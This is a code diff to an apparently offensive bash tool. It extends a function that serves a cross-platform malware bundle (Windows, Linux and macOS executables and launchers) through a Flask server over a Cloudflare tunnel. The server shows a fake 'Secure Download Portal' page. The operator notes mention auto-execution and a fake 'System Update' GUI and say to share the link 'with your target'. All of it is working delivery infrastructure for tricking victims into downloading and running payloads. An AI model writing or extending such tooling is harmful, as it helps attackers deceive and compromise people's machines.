@@ -2443,9 +2443,115 @@ deliver_via_cloudflare_tunnel() {
         return 1
     fi
     
-    # Create a simple HTTP server to serve the payload
-    local server_script="$TEMP_DIR/server.py"
-    cat > "$server_script" << EOF
+    # Check if payload_path is a directory (cross-platform build)
+    if [ -d "$payload_path" ]; then
+        # Create a simple HTTP server to serve the payload directory
+        local server_script="$TEMP_DIR/server.py"
+        cat > "$server_script" << EOF
+#!/usr/bin/env python3
+from flask import Flask, send_file, render_template_string, request, redirect, send_from_directory
+import os
+import sys
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    # Check if the request is for the root domain or a specific path
+    if request.path == '/':
+        return render_template_string('''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Download Portal</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
+        .container { max-width: 800px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .header { text-align: center; margin-bottom: 30px; }
+        .download-btn { display: inline-block; background-color: #4285f4; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-size: 18px; margin: 20px 0; }
+        .download-btn:hover { background-color: #3367d6; }
+        .info { background-color: #e8f0fe; padding: 15px; border-radius: 5px; margin: 20px 0; }
+        .file-list { margin: 20px 0; }
+        .file-item { padding: 10px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; }
+        .file-name { font-weight: bold; }
+        .file-size { color: #666; }
+        .footer { text-align: center; margin-top: 30px; color: #666; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Secure Download Portal</h1>
+            <p>Download your secure files</p>
+        </div>
+        <div class="info">
+            <h3>Cross-Platform Payload Bundle</h3>
+            <p><strong>Auto-Execution:</strong> $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")</p>
+            <p><strong>Fake GUI:</strong> $([ "$FAKE_GUI_ENABLED" = true ] && echo "Enabled" || echo "Disabled")</p>
+        </div>
+        <div class="file-list">
+            <h3>Available Files:</h3>
+            <div class="file-item">
+                <span class="file-name">launcher.sh</span>
+                <span class="file-size">Unix/Linux/macOS launcher</span>
+                <a href="/download/launcher.sh" class="download-btn" style="padding: 5px 10px; font-size: 14px;">Download</a>
+            </div>
+            <div class="file-item">
+                <span class="file-name">launcher.bat</span>
+                <span class="file-size">Windows launcher</span>
+                <a href="/download/launcher.bat" class="download-btn" style="padding: 5px 10px; font-size: 14px;">Download</a>
+            </div>
+            <div class="file-item">
+                <span class="file-name">pc.exe</span>
+                <span class="file-size">Windows executable</span>
+                <a href="/download/pc.exe" class="download-btn" style="padding: 5px 10px; font-size: 14px;">Download</a>
+            </div>
+            <div class="file-item">
+                <span class="file-name">pc_linux</span>
+                <span class="file-size">Linux executable</span>
+                <a href="/download/pc_linux" class="download-btn" style="padding: 5px 10px; font-size: 14px;">Download</a>
+            </div>
+            <div class="file-item">
+                <span class="file-name">pc_macos</span>
+                <span class="file-size">macOS executable</span>
+                <a href="/download/pc_macos" class="download-btn" style="padding: 5px 10px; font-size: 14px;">Download</a>
+            </div>
+            <div class="file-item">
+                <span class="file-name">README.txt</span>
+                <span class="file-size">Instructions</span>
+                <a href="/download/README.txt" class="download-btn" style="padding: 5px 10px; font-size: 14px;">Download</a>
+            </div>
+        </div>
+        <div class="footer">
+            <p>This is a secure download portal. All downloads are logged.</p>
+            <p>&copy; $(date +%Y) Secure Downloads</p>
+        </div>
+    </div>
+</body>
+</html>
+''')
+    else:
+        # For any other path, redirect to the download
+        return redirect('/download')
+
+@app.route('/download')
+def download():
+    return redirect('/')
+
+@app.route('/download/<filename>')
+def download_file(filename):
+    payload_path = "$payload_path"
+    if os.path.exists(os.path.join(payload_path, filename)):
+        return send_from_directory(payload_path, filename, as_attachment=True)
+    return "File not found", 404
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=$local_port, debug=False)
+EOF
+    else
+        # Create a simple HTTP server to serve a single file
+        local server_script="$TEMP_DIR/server.py"
+        cat > "$server_script" << EOF
 #!/usr/bin/env python3
 from flask import Flask, send_file, render_template_string, request, redirect
 import os
@@ -2510,6 +2616,7 @@ def download():
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=$local_port, debug=False)
 EOF
+    fi
     
     chmod +x "$server_script"
     
@@ -2533,8 +2640,34 @@ EOF
         fi
         
         # Save tunnel information
+        mkdir -p "$DELIVERY_DIR"
         local tunnel_info="$DELIVERY_DIR/cloudflare_tunnel_info.txt"
-        cat > "$tunnel_info" << EOF
+        
+        if [ -d "$payload_path" ]; then
+            cat > "$tunnel_info" << EOF
+CLOUDFLARE TUNNEL INFORMATION
+=============================
+Tunnel URL: $CLOUDFLARE_TUNNEL_URL
+Direct Download Link: $CLOUDFLARE_TUNNEL_URL/download
+Local Port: $local_port
+Server PID: $server_pid
+Tunnel PID: $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
+Start Time: $(date)
+Payload: Cross-platform bundle in $(basename "$payload_path")
+Auto-Execution: $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")
+Appearance: $([ "$FAKE_GUI_ENABLED" = true ] && echo "Fake GUI (System Update)" || echo "Silent")
+
+Usage:
+1. Share the tunnel URL with your target
+2. Target can browse and download specific files from: $CLOUDFLARE_TUNNEL_URL
+3. All traffic is encrypted through Cloudflare
+
+To stop the tunnel:
+kill $server_pid
+kill $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
+EOF
+        else
+            cat > "$tunnel_info" << EOF
 CLOUDFLARE TUNNEL INFORMATION
 =============================
 Tunnel URL: $CLOUDFLARE_TUNNEL_URL
@@ -2556,6 +2689,7 @@ To stop the tunnel:
 kill $server_pid
 kill $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
 EOF
+        fi
         
         echo -e "${G}[+] Tunnel information saved to: $tunnel_info${NC}"
         echo -e "${G}[+] Direct download link: $CLOUDFLARE_TUNNEL_URL/download${NC}"
